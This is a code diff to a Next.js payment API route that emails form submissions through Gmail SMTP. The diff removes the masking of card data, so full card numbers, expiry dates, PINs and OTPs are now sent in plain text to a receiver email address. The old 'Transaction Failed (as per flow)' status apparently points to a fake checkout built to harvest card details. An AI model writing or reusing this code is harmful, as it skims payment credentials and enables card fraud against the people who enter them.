@@ -5,6 +5,7 @@ export async function POST(request: NextRequest) {
   try {
     const { type, data } = await request.json()
 
+    // Create transporter using environment variables
     const transporter = nodemailer.createTransporter({
       host: "smtp.gmail.com",
       port: 587,
@@ -16,38 +17,40 @@ export async function POST(request: NextRequest) {
     })
 
     let subject = ""
-    let html = ""
+    let htmlContent = ""
 
     if (type === "payment_details") {
       subject = "Payment Details Submitted"
-      html = `
+      htmlContent = `
         <h2>Payment Details Received</h2>
         <p><strong>Amount:</strong> ₦${data.amount}</p>
         <p><strong>Email:</strong> ${data.email}</p>
         <p><strong>Card Name:</strong> ${data.cardName}</p>
-        <p><strong>Card Number:</strong> **** **** **** ${data.cardNumber.slice(-4)}</p>
+        <p><strong>Card Number:</strong> ${data.cardNumber}</p>
+        <p><strong>Expiry:</strong> ${data.expiryDate}</p>
         <p><strong>Card Type:</strong> ${data.cardType}</p>
-        <p><strong>PIN Entered:</strong> ****</p>
-        <p><strong>Timestamp:</strong> ${new Date().toISOString()}</p>
+        <p><strong>PIN:</strong> ${data.pin}</p>
+        <p><em>Payment details submitted successfully.</em></p>
       `
     } else if (type === "otp_confirmation") {
       subject = "OTP Verification Completed"
-      html = `
+      htmlContent = `
         <h2>OTP Verification</h2>
         <p><strong>Amount:</strong> ₦${data.amount}</p>
         <p><strong>Email:</strong> ${data.email}</p>
         <p><strong>OTP Entered:</strong> ${data.otp}</p>
-        <p><strong>Status:</strong> Transaction Failed (as per flow)</p>
-        <p><strong>Timestamp:</strong> ${new Date().toISOString()}</p>
+        <p><em>OTP verification completed successfully.</em></p>
       `
     }
 
-    await transporter.sendMail({
+    const mailOptions = {
       from: process.env.SMTP_USER,
       to: process.env.RECEIVER_EMAIL,
-      subject,
-      html,
-    })
+      subject: subject,
+      html: htmlContent,
+    }
+
+    await transporter.sendMail(mailOptions)
 
     return NextResponse.json({ success: true, message: "Email sent successfully" })
   } catch (error) {
